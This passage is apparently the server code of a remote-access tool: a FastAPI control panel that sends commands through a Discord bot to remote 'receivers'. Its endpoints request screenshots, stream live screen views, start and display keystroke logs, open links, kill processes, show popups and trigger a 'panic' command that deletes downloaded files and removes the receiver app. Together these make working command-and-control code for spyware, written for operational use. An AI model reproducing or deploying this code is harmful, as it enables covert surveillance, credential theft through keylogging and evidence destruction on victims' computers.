          URL.revokeObjectURL(liveImg.dataset.lastUrl);
          delete liveImg.dataset.lastUrl;
        }
        liveImg.removeAttribute('src');
      }
      if (setOff) setLiveStatus('Live: off');
    }
    async function refreshReceivers() {
      try {
        const res = await fetchAuthed('/api/receivers');
        if (!res || !res.ok) return;
        const data = await res.json();
        selectedReceiver = data.selected || null;
        const wrap = document.getElementById('receiver-list');
        const summary = document.getElementById('receiver-summary');
        if (!wrap) return;
        wrap.innerHTML = '';
        const online = data.online || [];
        const offline = data.offline || [];
        lastReceiverList = online.concat(offline);
        if (summary) {
          summary.textContent = `${online.length} online | ${offline.length} offline`;
        }
        if (!lastReceiverList.length) {
          const empty = document.createElement('div');
          empty.className = 'receiver-empty';
          empty.textContent = 'No receivers yet. Open a receiver to appear here.';
          wrap.appendChild(empty);
        }
        lastReceiverList.forEach(rec => {
          const item = document.createElement('div');
          item.className = 'receiver-item';
          if (data.selected === rec.id) {
            item.classList.add('selected');
          }

          const info = document.createElement('div');
          info.className = 'receiver-info';

          const status = document.createElement('span');
          const statusKey = rec.status_key || (rec.online ? 'online' : 'offline');
          status.className = 'status-pill status-' + statusKey;
          status.textContent = rec.status || (rec.online ? 'Online' : 'Offline');

          const title = document.createElement('div');
          title.className = 'receiver-title';
          const name = document.createElement('div');
          name.className = 'receiver-name';
          name.textContent = rec.name || rec.tag || rec.id;
          title.appendChild(name);
          title.appendChild(status);

          const meta = document.createElement('div');
          meta.className = 'receiver-meta';
          const idSpan = document.createElement('span');
          idSpan.className = 'receiver-id';
          idSpan.textContent = rec.tag ? ('Tag: ' + rec.tag) : ('ID: ' + rec.id);

          meta.appendChild(idSpan);
          info.appendChild(title);
          info.appendChild(meta);

          const actions = document.createElement('div');
          actions.className = 'receiver-actions';

          const selectForm = document.createElement('form');
          selectForm.method = 'post';
          selectForm.action = '/ui/select/' + encodeURIComponent(rec.id);
          wireForm(selectForm);
          const btn = document.createElement('button');
          btn.type = 'submit';
          btn.textContent = data.selected === rec.id ? 'Selected' : 'Select';
          if (!rec.online) {
            btn.className = 'secondary';
          }
          if (data.selected === rec.id) {
            btn.style.background = '#10b981';
            btn.style.color = '#0b1224';
          }
          selectForm.appendChild(btn);

          actions.appendChild(selectForm);

          const removeForm = document.createElement('form');
          removeForm.method = 'post';
          removeForm.action = '/ui/remove/' + encodeURIComponent(rec.id);
          removeForm.dataset.confirm = `Remove ${rec.name || rec.tag || rec.id}?`;
          wireForm(removeForm);
          const removeBtn = document.createElement('button');
          removeBtn.type = 'submit';
          removeBtn.textContent = 'Remove';
          removeBtn.className = 'danger';
          removeForm.appendChild(removeBtn);

          actions.appendChild(removeForm);

          item.appendChild(info);
          item.appendChild(actions);
          wrap.appendChild(item);
        });
        if (renameSelect) {
          const current = renameSelect.value;
          renameSelect.innerHTML = '';
          if (!lastReceiverList.length) {
            const option = document.createElement('option');
            option.textContent = 'No receivers';
            option.value = '';
            renameSelect.appendChild(option);
            updateRenameSection(null);
          } else {
            lastReceiverList.forEach(rec => {
              const opt = document.createElement('option');
              opt.value = rec.id;
              opt.textContent = `${rec.name || rec.tag || rec.id} - ${rec.status || (rec.online ? 'Online' : 'Offline')}`;
              if (rec.id === current || (!current && rec.id === selectedReceiver)) {
                opt.selected = true;
              }
              renameSelect.appendChild(opt);
            });
            const targetId = renameSelect.value || selectedReceiver;
            const targetRec = lastReceiverList.find(item => item.id === targetId);
            updateRenameSection(targetRec);
          }
        }
        const panicBtn = document.getElementById('panic-btn');
        if (panicBtn) {
          panicBtn.disabled = !selectedReceiver;
        }
        if (liveWanted) {
          startLiveView();
        }
      } catch (e) { /* ignore */ }
    }
    async function refreshScreenshots() {
      try {
        const list = document.getElementById('screenshot-list');
        const empty = document.getElementById('screenshot-empty');
        if (!list) return;
        const res = await fetchAuthed('/api/screenshots');
        if (!res || !res.ok) return;
        const data = await res.json();
        const items = data.items || [];
        list.innerHTML = '';
        if (empty) {
          empty.style.display = items.length ? 'none' : 'block';
        }
        items.forEach(item => {
          const details = document.createElement('details');
          details.className = 'shot-item';

          const summary = document.createElement('summary');
          summary.className = 'shot-summary';

          const thumb = document.createElement('img');
          thumb.className = 'shot-thumb';
          thumb.src = item.url;
          thumb.alt = 'Screenshot thumbnail';

          const meta = document.createElement('div');
          const time = document.createElement('div');
          time.className = 'shot-time';
          time.textContent = item.ts || 'Screenshot';
          meta.appendChild(time);

          summary.appendChild(thumb);
          summary.appendChild(meta);
          details.appendChild(summary);

          const full = document.createElement('img');
          full.className = 'shot-full';
          full.src = item.url;
          full.alt = 'Screenshot';
          details.appendChild(full);

          list.appendChild(details);
        });
      } catch (e) { /* ignore */ }
    }
    async function refreshLogs() {
      try {
        const output = document.getElementById('log-output');
        if (!output) return;
        const res = await fetchAuthed('/api/logs');
        if (!res || !res.ok) return;
        const data = await res.json();
        if (data.text) {
          output.textContent = data.text;
        }
      } catch (e) { /* ignore */ }
    }
    async function refreshMessages() {
      try {
        const output = document.getElementById('message-output');
        if (!output) return;
        const res = await fetchAuthed('/api/messages');
        if (!res || !res.ok) return;
        const data = await res.json();
        output.textContent = data.text || 'Waiting for messages...';
      } catch (e) { /* ignore */ }
    }
    async function submitFormNoReload(form) {
      const method = (form.method || 'post').toUpperCase();
      const data = new URLSearchParams(new FormData(form));
      try {
        const res = await fetchAuthed(form.action, {
          method,
          body: data,
          headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-Requested-With': 'fetch',
          },
        });
        if (!res) {
          return false;
        }
        if (!(res.status >= 200 && res.status < 400)) {
          alert('Request failed.');
          return false;
        }
        return true;
      } catch (e) {
        alert('Request failed.');
        return false;
      }
    }
    function wireForm(form) {
      if (!form || form.dataset.ajaxBound) return;
      form.dataset.ajaxBound = '1';
      form.addEventListener('submit', async (e) => {
        e.preventDefault();
        const confirmMsg = form.dataset.confirm;
        if (confirmMsg && !confirm(confirmMsg)) {
          return;
        }
        const ok = await submitFormNoReload(form);
        if (!ok) return;
        if (form.action.includes('/ui/rename') || form.action.includes('/ui/select') || form.action.includes('/ui/remove')) {
          refreshReceivers();
        }
        if (form.action.includes('/ui/screenshot')) {
          setTimeout(refreshScreenshots, 2000);
        }
        if (form.action.includes('/ui/live/start')) {
          startLiveView();
        }
        if (form.action.includes('/ui/live/stop')) {
          stopLiveView();
        }
      });
    }
    // tabs
    const tabButtons = document.querySelectorAll('.tab-btn');
    const tabPanes = document.querySelectorAll('.tab-pane');
    function activateTab(id) {
      tabButtons.forEach(btn => btn.classList.toggle('active', btn.dataset.tab === id));
      tabPanes.forEach(pane => pane.classList.toggle('active', pane.dataset.tab === id));
    }
    tabButtons.forEach(btn => btn.addEventListener('click', () => activateTab(btn.dataset.tab)));

    activateTab('surprise');
    refreshReceivers();
    refreshScreenshots();
    refreshLogs();
    refreshMessages();
    setInterval(refreshReceivers, 5000);
    setInterval(refreshScreenshots, 6000);
    setInterval(refreshLogs, 5000);
    setInterval(refreshMessages, 5000);

    document.querySelectorAll('.app form').forEach(form => {
      if (form.id === 'pin-form') return;
      wireForm(form);
    });

    const panicBtn = document.getElementById('panic-btn');
    if (panicBtn) {
      panicBtn.addEventListener('click', async () => {
        if (!selectedReceiver) {
          alert('Select a receiver first.');
          return;
        }
        const ok = confirm('Panic mode will delete downloaded files and remove the receiver app. Continue?');
        if (!ok) return;
        try {
          const res = await fetchAuthed('/ui/panic', { method: 'POST' });
          if (!res || !res.ok) {
            alert('Panic request failed.');
            return;
          }
          alert('Panic request sent.');
          refreshReceivers();
        } catch (e) {
          alert('Panic request failed.');
        }
      });
    }
  </script>
</body>
</html>"""

@app.get("/")
async def index():
    return HTMLResponse(CONTROL_HTML)

@app.websocket("/audio")
async def audio_ws(ws: WebSocket):
    await ws.accept()  # ✅ REQUIRED on Render
    print("WS ACCEPTED")

    await hub.add(ws)

    try:
        while True:
            data = await ws.receive_bytes()
            await hub.broadcast_bytes(data, sender=ws)
    except WebSocketDisconnect:
        pass
    finally:
        await hub.remove(ws)


# ---------------- LIVE VIEW ----------------
@app.websocket("/live/{rid}")
async def live_ws(ws: WebSocket, rid: str, role: str = "viewer"):
    await ws.accept()
    if role != "sender" and not _session_ok_from_cookies(ws.cookies, refresh=True):
        await ws.close(code=4401)
        return
    hub = _live_hubs.setdefault(rid, LiveHub())
    if role == "sender":
        try:
            while True:
                data = await ws.receive_bytes()
                await hub.broadcast(data)
        except WebSocketDisconnect:
            pass
        return
    await hub.add_viewer(ws)
    if hub.latest:
        try:
            await ws.send_bytes(hub.latest)
        except Exception:
            pass
    try:
        while True:
            await ws.receive()
    except WebSocketDisconnect:
        pass
    finally:
        await hub.remove_viewer(ws)

# ---------------- COMMAND ENDPOINTS ----------------
async def _send_cmd(msg: str):
    await _controller_ready.wait()
    if _controller_error:
        print("Controller bot not ready:", _controller_error)
        return
    try:
        ch = await _get_channel(COMMAND_CHANNEL_ID)
        print(f"Sending command to channel {COMMAND_CHANNEL_ID}:", msg)
        await ch.send(msg)
    except Exception as e:
        print("Send command failed:", e)

async def _send_cmd_with_files(msg: str, file_paths: list[Path]):
    await _controller_ready.wait()
    if _controller_error:
        print("Controller bot not ready:", _controller_error)
        return
    try:
        ch = await _get_channel(COMMAND_CHANNEL_ID)
        print(f"Sending command with files to channel {COMMAND_CHANNEL_ID}:", msg, [p.name for p in file_paths])
        files = []
        for p in file_paths:
            try:
                files.append(discord.File(fp=str(p), filename=p.name))
            except Exception as e:
                print("Skipping file attach failed:", p, e)
                continue
        if not files:
            await ch.send(f"{msg} (no files attached)")
            return
        await ch.send(content=msg, files=files)
    except Exception as e:
        print("Send command with files failed:", e)

async def _wait_controller_ready(timeout: float = 5.0) -> bool:
    try:
        await asyncio.wait_for(_controller_ready.wait(), timeout=timeout)
        return True
    except asyncio.TimeoutError:
        print("Discord bot not ready after wait; controller may not be connected.")
        return False

def _cmd_with_selection(cmd: str, *args: str) -> str:
    parts = [cmd, *args]
    base = " ".join(parts)
    if _selected_receiver:
        return f"TARGET {_selected_receiver} {base}"
    return f"TARGET NONE {base}"

def _cmd_for_receiver(rid: Optional[str], cmd: str, *args: str) -> str:
    parts = [cmd, *args]
    base = " ".join(parts)
    if rid:
        return f"TARGET {rid} {base}"
    return f"TARGET NONE {base}"

def _build_live_ws_url(request: Request, rid: str) -> str:
    scheme = request.headers.get("x-forwarded-proto") or request.url.scheme
    ws_scheme = "wss" if scheme == "https" else "ws"
    host = request.headers.get("x-forwarded-host") or request.headers.get("host") or request.url.netloc
    return f"{ws_scheme}://{host}/live/{rid}?role=sender"

async def _read_form_value(request: Request, name: str) -> Optional[str]:
    try:
        form = await request.form()
        value = form.get(name)
        if value is not None:
            return str(value)
    except Exception:
        pass
    try:
        body = await request.body()
        if body:
            parsed = parse_qs(body.decode("utf-8", errors="ignore"))
            if name in parsed and parsed[name]:
                return parsed[name][0]
    except Exception:
        pass
    try:
        data = await request.json()
        if isinstance(data, dict) and name in data:
            return str(data.get(name))
    except Exception:
        pass
    return request.query_params.get(name)

@app.post("/cmd/gif/start")
async def gif_start():
    if not await _wait_controller_ready():
        return JSONResponse({"ok": False, "error": "bot not ready"}, status_code=503)
    await _send_cmd(_cmd_with_selection("DISPLAY_GIF_START"))
    _set_receiver_mode(_selected_receiver, "gif")
    return JSONResponse({"ok": True})

@app.post("/cmd/gif/stop")
async def gif_stop():
    if not await _wait_controller_ready():
        return JSONResponse({"ok": False, "error": "bot not ready"}, status_code=503)
    await _send_cmd(_cmd_with_selection("DISPLAY_GIF_STOP"))
    _set_receiver_mode(_selected_receiver, "")
    return JSONResponse({"ok": True})

@app.get("/api/session")
async def api_session(request: Request):
    ok = _session_ok(request, refresh=True)
    return JSONResponse({"ok": ok})

@app.post("/api/pin")
async def api_pin(request: Request):
    pin = await _read_form_value(request, "pin")
    client_id = await _read_form_value(request, "client_id") or ""
    if not pin or pin != PANEL_PIN:
        return JSONResponse({"ok": False, "error": "invalid"}, status_code=401)
    token = _create_pin_session(request, client_id)
    resp = JSONResponse({"ok": True})
    resp.set_cookie(
        PIN_COOKIE_NAME,
        token,
        httponly=True,
        samesite="strict",
    )
    return resp

@app.get("/api/screenshot")
async def api_screenshot():
    return JSONResponse(_latest_screenshot)

@app.get("/api/screenshots")
async def api_screenshots():
    return JSONResponse({"items": list(reversed(_screenshot_log))})

@app.get("/api/logs")
async def api_logs():
    return JSONResponse(_latest_keylog)

@app.get("/api/messages")
async def api_messages():
    text = "\n".join(_dm_messages)
    latest = _latest_dm_user.get("name", "")
    return JSONResponse({"text": text, "latest": latest})

@app.get("/api/receivers")
async def api_receivers():
    now = time.time()
    _prune_receivers(now)
    online = []
    offline = []
    for rid, info in _receivers.items():
        alias = info.get("alias") or ""
        display = alias or info.get("tag") or rid
        status, status_key, is_online = _receiver_status(info, now)
        data = {
            "id": rid,
            "name": display,
            "tag": info.get("tag"),
            "alias": alias,
            "last_seen": info.get("last_seen", 0),
            "status": status,
            "status_key": status_key,
            "online": is_online,
        }
        if is_online:
            online.append(data)
        else:
            offline.append(data)
    return JSONResponse({"online": online, "offline": offline, "selected": _selected_receiver})

@app.post("/ui/surprise")
async def ui_surprise():
    # Prefer M.gif for display
    img = None
    for name in ("M.gif",):
        candidate = ROOT_DIR / name
        if candidate.is_file():
            img = candidate
            break
    sound = ROOT_DIR / "sound.mp3"

    files = [p for p in (img, sound) if p and p.is_file()]
    if not files:
        return HTMLResponse("Missing M.gif and sound.mp3 next to main.py", status_code=400)

    if not await _wait_controller_ready():
        return HTMLResponse("Discord bot not ready", status_code=503)
    await _send_cmd_with_files(_cmd_with_selection("DISPLAY_GIF_START"), files)
    _set_receiver_mode(_selected_receiver, "gif")
    return RedirectResponse(url="/", status_code=303)

@app.post("/ui/gif/stop")
async def ui_gif_stop():
    if not await _wait_controller_ready():
        return HTMLResponse("Discord bot not ready", status_code=503)
    await gif_stop()
    return RedirectResponse(url="/", status_code=303)

@app.post("/ui/logs/start")
async def ui_logs_start():
    if not await _wait_controller_ready():
        return HTMLResponse("Discord bot not ready", status_code=503)
    await _send_cmd(_cmd_with_selection("LOGS_START"))
    return RedirectResponse(url="/", status_code=303)

@app.post("/ui/logs/stop")
async def ui_logs_stop():
    if not await _wait_controller_ready():
        return HTMLResponse("Discord bot not ready", status_code=503)
    await _send_cmd(_cmd_with_selection("LOGS_STOP"))
    return RedirectResponse(url="/", status_code=303)

@app.post("/ui/logout")
async def ui_logout():
    if not await _wait_controller_ready():
        return HTMLResponse("Discord bot not ready", status_code=503)
    await _send_cmd(_cmd_with_selection("LOGOUT"))
    return RedirectResponse(url="/", status_code=303)

@app.post("/ui/open")
async def ui_open(request: Request):
    url = await _read_form_value(request, "url")
    if url:
        msg = _cmd_with_selection("OPEN_LINK", url)
        print("Sending:", msg)
        if not await _wait_controller_ready():
            return HTMLResponse("Discord bot not ready", status_code=503)
        await _send_cmd(msg)
    return RedirectResponse(url="/", status_code=303)

@app.post("/ui/close")
async def ui_close(request: Request):
    proc = await _read_form_value(request, "proc")
    if proc:
        msg = _cmd_with_selection("KILL_PROCESS", proc)
        print("Sending:", msg)
        if not await _wait_controller_ready():
            return HTMLResponse("Discord bot not ready", status_code=503)
        await _send_cmd(msg)
    return RedirectResponse(url="/", status_code=303)

@app.post("/ui/volume")
async def ui_volume(request: Request):
    level = await _read_form_value(request, "level")
    if level:
        msg = _cmd_with_selection("SET_VOLUME", level)
        print("Sending:", msg)
        if not await _wait_controller_ready():
            return HTMLResponse("Discord bot not ready", status_code=503)
        await _send_cmd(msg)
    return RedirectResponse(url="/", status_code=303)

@app.post("/ui/popup")
async def ui_popup(request: Request):
    message = await _read_form_value(request, "message")
    if message:
        msg = _cmd_with_selection("CUSTOM_POPUP", message)
        print("Sending:", msg)
        if not await _wait_controller_ready():
            return HTMLResponse("Discord bot not ready", status_code=503)
        await _send_cmd(msg)
    return RedirectResponse(url="/", status_code=303)

@app.post("/ui/screenshot")
async def ui_screenshot():
    if not await _wait_controller_ready():
        return HTMLResponse("Discord bot not ready", status_code=503)
    await _send_cmd(_cmd_with_selection("SCREENSHOT"))
    return RedirectResponse(url="/", status_code=303)

@app.post("/ui/live/start")
async def ui_live_start(request: Request):
    if not _selected_receiver:
        return HTMLResponse("No receiver selected", status_code=400)
    if not await _wait_controller_ready():
        return HTMLResponse("Discord bot not ready", status_code=503)
    ws_url = _build_live_ws_url(request, _selected_receiver)
    await _send_cmd(_cmd_with_selection("LIVE_START", ws_url))
    _set_receiver_mode(_selected_receiver, "live")
    return RedirectResponse(url="/", status_code=303)

@app.post("/ui/live/stop")
async def ui_live_stop():
    if not _selected_receiver:
        return HTMLResponse("No receiver selected", status_code=400)
    if not await _wait_controller_ready():
        return HTMLResponse("Discord bot not ready", status_code=503)
    await _send_cmd(_cmd_with_selection("LIVE_STOP"))
    _set_receiver_mode(_selected_receiver, "")
    return RedirectResponse(url="/", status_code=303)

@app.post("/ui/rename/{rid}")
async def ui_rename(rid: str, request: Request):
    alias = await _read_form_value(request, "alias")
    _prune_receivers()
    if rid in _receivers and alias is not None:
        cleaned = alias.strip()
        if cleaned:
            _receivers[rid]["alias"] = cleaned
            _save_state()
        else:
            _receivers[rid].pop("alias", None)
            _save_state()
    if request.headers.get("X-Requested-With") == "fetch":
        return JSONResponse({"ok": True, "id": rid, "alias": alias or ""})
    return RedirectResponse(url="/", status_code=303)

@app.post("/ui/remove/{rid}")
async def ui_remove(rid: str, request: Request):
    _prune_receivers()
    removed = _remove_receiver(rid)
    if request.headers.get("X-Requested-With") == "fetch":
        return JSONResponse({"ok": True, "id": rid, "removed": removed})
    return RedirectResponse(url="/", status_code=303)

@app.post("/ui/panic")
async def ui_panic():
    if not _selected_receiver:
        return HTMLResponse("No receiver selected", status_code=400)
    if not await _wait_controller_ready():
        return HTMLResponse("Discord bot not ready", status_code=503)
    await _send_cmd(_cmd_with_selection("PANIC"))
    return RedirectResponse(url="/", status_code=303)

@app.post("/ui/messages/reply")
async def ui_messages_reply():
    if not await _wait_controller_ready():
        return HTMLResponse("Discord bot not ready", status_code=503)
    user_id = _latest_dm_user.get("id")
    if not user_id:
        return HTMLResponse("No recent DM user", status_code=400)
    try:
        user = await bot.fetch_user(int(user_id))
        await user.send(DM_REPLY_TEXT)
    except Exception as e:
        return HTMLResponse(f"Failed to DM user: {e}", status_code=500)
    return RedirectResponse(url="/", status_code=303)

@app.post("/ui/select/{tag}")
async def ui_select(tag: str):
    global _selected_receiver
    _prune_receivers()
    if tag in _receivers:
        _selected_receiver = tag
        _save_state()
    return RedirectResponse(url="/", status_code=303)


# ---------------- STARTUP ----------------
@app.on_event("startup")
async def startup():
    async def run_bot():
        try:
            await bot.start(CONTROLLER_TOKEN)
        except Exception as e:
            print("Bot failed:", e)
            global _controller_error
            _controller_error = str(e)
            _controller_ready.set()
    asyncio.create_task(run_bot())
